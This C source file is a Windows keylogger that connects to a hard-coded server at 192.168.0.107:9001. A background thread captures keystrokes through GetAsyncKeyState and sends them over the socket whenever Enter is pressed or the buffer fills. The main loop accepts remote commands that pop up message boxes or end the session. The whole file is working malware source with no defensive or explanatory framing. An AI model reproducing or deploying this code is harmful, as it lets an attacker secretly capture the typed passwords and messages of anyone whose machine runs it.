#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h> // For _beginthreadex

#pragma comment(lib, "ws2_32.lib")

volatile int keep_keylogging = 1;

// Background keylogger thread
unsigned __stdcall keylogger_thread(void* arg) {
    SOCKET s = (SOCKET)(uintptr_t)arg;
    char log[1024] = {0};
    int idx = 0;
    while (keep_keylogging) {
        for (int vk = 8; vk <= 222; vk++) {
            SHORT state = GetAsyncKeyState(vk);
            if (state & 0x0001) { // Just pressed
                if ((vk >= 'A' && vk <= 'Z') || (vk >= '0' && vk <= '9')) {
                    log[idx++] = (char)vk;
                } else if (vk == VK_SPACE) {
                    log[idx++] = ' ';
                } else if (vk == VK_RETURN) {
                    log[idx++] = '\n';
                }
                if (idx >= sizeof(log) - 2 || vk == VK_RETURN) {
                    log[idx] = 0;
                    send(s, log, strlen(log), 0);
                    idx = 0;
                }
            }
        }
        Sleep(10);
    }
    return 0;
}

// Thread function for message box
unsigned __stdcall show_messagebox(void* arg) {
    char* msg = (char*)arg;
    MessageBoxA(NULL, msg, "Server Message", MB_OK | MB_ICONINFORMATION);
    free(msg);
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char buf[1024], cmd[16], arg[1000];

    WSAStartup(MAKEWORD(2,2), &wsa);

    s = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_addr.s_addr = inet_addr("192.168.0.107"); // Change to server IP if needed
    server.sin_family = AF_INET;
    server.sin_port = htons(9001);

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) < 0) {
        return 1;
    }

    // Start keylogger thread
    HANDLE hKeylog = (HANDLE)_beginthreadex(NULL, 0, keylogger_thread, (void*)(uintptr_t)s, 0, NULL);

    while (1) {
        int len = recv(s, buf, sizeof(buf)-1, 0);
        if (len <= 0) break;
        buf[len] = 0;

        sscanf(buf, "%15s %999[^\n]", cmd, arg);

        if (_stricmp(cmd, "PRINT") == 0) {
            char* msg = _strdup(arg);
            _beginthreadex(NULL, 0, show_messagebox, msg, 0, NULL);
            send(s, "Printed OK", 10, 0);
        } else if (_stricmp(cmd, "MSGBOX") == 0) {
            char* msg = _strdup(arg);
            _beginthreadex(NULL, 0, show_messagebox, msg, 0, NULL);
            send(s, "MessageBox OK", 13, 0);
        } else if (_stricmp(cmd, "EXIT") == 0) {
            send(s, "Bye", 3, 0);
            break;
        } else {
            send(s, "Unknown command", 15, 0);
        }
    }

    // Stop keylogger thread
    keep_keylogging = 0;
    Sleep(100); // Give thread time to exit
    closesocket(s);
    WSACleanup();
    return 0;
}